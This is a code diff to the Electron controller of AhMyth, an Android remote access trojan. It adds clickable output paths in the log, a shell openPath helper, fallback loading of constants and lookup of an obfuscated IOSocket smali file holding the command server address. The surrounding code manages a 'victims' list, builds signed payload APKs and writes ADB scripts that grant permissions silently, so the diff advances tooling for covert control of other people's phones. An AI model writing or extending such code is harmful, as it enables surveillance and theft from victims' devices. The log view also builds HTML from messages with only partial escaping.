@@ -7,23 +7,58 @@ const {
 } = require('electron');
 
 // Handle remote module with error handling
-let dialog, victimsList;
+let dialog, victimsList, shell;
 try {
     dialog = remote ? remote.dialog : null;
     victimsList = remote ? remote.require('./main') : null;
+    shell = remote ? remote.shell : require('electron').shell;
 } catch (e) {
     console.error("Failed to load remote modules:", e);
     dialog = null;
     victimsList = null;
+    shell = null;
 }
 
 var fs = require('fs-extra');
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
+const path = require('path');
 var homedir = require('node-homedir');
 const {
     dirname
 } = require('path');
 var dir = require("path");
+
+// Fix Constants require path - use path resolution that works in Electron renderer
+let CONSTANTS;
+try {
+    // Try relative path first (works when script is loaded as module)
+    CONSTANTS = require('../Constants');
+} catch (e) {
+    try {
+        // Fallback: resolve from app directory
+        const remote = require('electron').remote;
+        if (remote && remote.app) {
+            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
+            CONSTANTS = require(appPath);
+        } else {
+            // Last resort: try resolving from known structure
+            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
+            CONSTANTS = require(constantsPath);
+        }
+    } catch (e2) {
+        console.error('Failed to load Constants:', e2);
+        // Create a minimal fallback to prevent complete failure
+        CONSTANTS = {
+            apkName: 'Ahmyth.apk',
+            signedApkName: 'Ahmyth-aligned-debugSigned.apk',
+            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
+            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
+            defaultPort: 1234,
+            dataDir: 'AhMyth',
+            downloadPath: 'Downloads',
+            outputApkPath: 'Output'
+        };
+    }
+}
 const {
     promisify
 } = require('util');
@@ -278,6 +313,47 @@ app.controller("AppCtrl", ($scope, $sce) => {
         $appCtrl.Log(`[→] Opening lab for victim: ${viclist[index].ip}`, CONSTANTS.logStatus.INFO);
         ipcRenderer.send('openLabWindow', 'lab.html', index);
     };
+    
+    // Function to open folder/file in system file manager
+    $appCtrl.openPath = (filePath) => {
+        if (!shell) {
+            $appCtrl.Log('[✗] Cannot open path: shell module not available', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        
+        try {
+            // Check if it's a file or folder
+            const fs = require('fs-extra');
+            const path = require('path');
+            
+            // Normalize the path
+            let normalizedPath = filePath.trim();
+            
+            // If it's a file, open the containing folder and select the file
+            if (fs.existsSync(normalizedPath)) {
+                const stats = fs.statSync(normalizedPath);
+                if (stats.isFile()) {
+                    // Open folder and select file (Windows/Linux/Mac)
+                    shell.showItemInFolder(normalizedPath);
+                } else {
+                    // It's a directory, just open it
+                    shell.openPath(normalizedPath);
+                }
+                $appCtrl.Log(`[✓] Opened: ${normalizedPath}`, CONSTANTS.logStatus.SUCCESS);
+            } else {
+                // Path doesn't exist, try to open parent directory
+                const parentDir = path.dirname(normalizedPath);
+                if (fs.existsSync(parentDir)) {
+                    shell.openPath(parentDir);
+                    $appCtrl.Log(`[ℹ] Opened parent folder: ${parentDir}`, CONSTANTS.logStatus.INFO);
+                } else {
+                    $appCtrl.Log(`[✗] Path not found: ${normalizedPath}`, CONSTANTS.logStatus.FAIL);
+                }
+            }
+        } catch (error) {
+            $appCtrl.Log(`[✗] Error opening path: ${error.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
 
 
     // Enhanced logging with detailed timestamps and levels
@@ -312,9 +388,26 @@ app.controller("AppCtrl", ($scope, $sce) => {
             hour12: false
         });
 
+        // Check if message contains a file path and make it clickable
+        let clickablePath = null;
+        let displayMsg = msg;
+        
+        // Detect file paths in the message (paths that start with └─ or contain drive letters or /)
+        // Match paths like: C:\path\to\file, /path/to/file, or paths after └─
+        const pathMatch = msg.match(/(?:└─\s*)?([A-Z]:[\\\/](?:[^\s<>"']+[\\\/])*[^\s<>"']+|(?:[\\\/][^\s<>"']+)+)/);
+        if (pathMatch && pathMatch[1]) {
+            clickablePath = pathMatch[1].trim();
+            // Escape HTML and create clickable link
+            const escapedPath = clickablePath.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+            displayMsg = msg.replace(clickablePath, `<a href="#" class="log-path-link" data-path="${escapedPath}" onclick="return false;">${clickablePath}</a>`);
+        }
+        
         $appCtrl.logs.push({
             date: `[${timestamp}]`,
             msg: msg,
+            displayMsg: displayMsg,
+            clickablePath: clickablePath,
+            isHtml: clickablePath !== null,
             color: fontColor,
             level: levelPrefix
         });
@@ -597,8 +690,12 @@ app.controller("AppCtrl", ($scope, $sce) => {
                         if (err) throw err;
 
                         delayedLog('[✓] Payload built successfully!', CONSTANTS.logStatus.SUCCESS);
+                        const signedApkPath = dir.join(outputPath, CONSTANTS.signedApkName);
                         delayedLog('[ℹ] Output location:', CONSTANTS.logStatus.INFO);
-                        delayedLog(`    └─ ${dir.join(outputPath, CONSTANTS.signedApkName)}`, CONSTANTS.logStatus.INFO);
+                        delayedLog(`    └─ ${signedApkPath}`, CONSTANTS.logStatus.INFO);
+                        // Store the output path for easy access
+                        $appCtrl.lastBuiltApkPath = signedApkPath;
+                        $appCtrl.lastOutputFolder = outputPath;
                         
                         // Generate ADB script for silent permissions if enabled
                         if ($appCtrl.silentPermOptions && $appCtrl.silentPermOptions.generateAdbScript) {
@@ -718,8 +815,9 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
             fs.writeFileSync(dir.join(outputPath, 'grant_permissions.bat'), batScript);
             fs.writeFileSync(dir.join(outputPath, 'grant_permissions.sh'), shScript);
             delayedLog('[✓] ADB permission scripts generated:', CONSTANTS.logStatus.SUCCESS);
-            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
-            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
+                        delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
+                        delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
+                        delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
         } catch (e) {
             delayedLog('[!] Failed to generate ADB scripts', CONSTANTS.logStatus.WARNING);
         }
@@ -1271,6 +1369,16 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
 
             // Build the IP:PORT file path
             var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+            
+            // Fallback for obfuscated file (p0.smali) if original IOSocket.smali is missing
+            if (!fs.existsSync(ipPortFile)) {
+                var obfuscatedFile = dir.join(CONSTANTS.ahmythApkFolderPath, 'smali', 'p0.smali');
+                if (fs.existsSync(obfuscatedFile)) {
+                    ipPortFile = obfuscatedFile;
+                    log('[ℹ] Using obfuscated IOSocket file (p0.smali)', CONSTANTS.logStatus.INFO);
+                }
+            }
+
             console.log('[AhMyth] IP:PORT file path:', ipPortFile);
             
             // check if bind apk is enabled
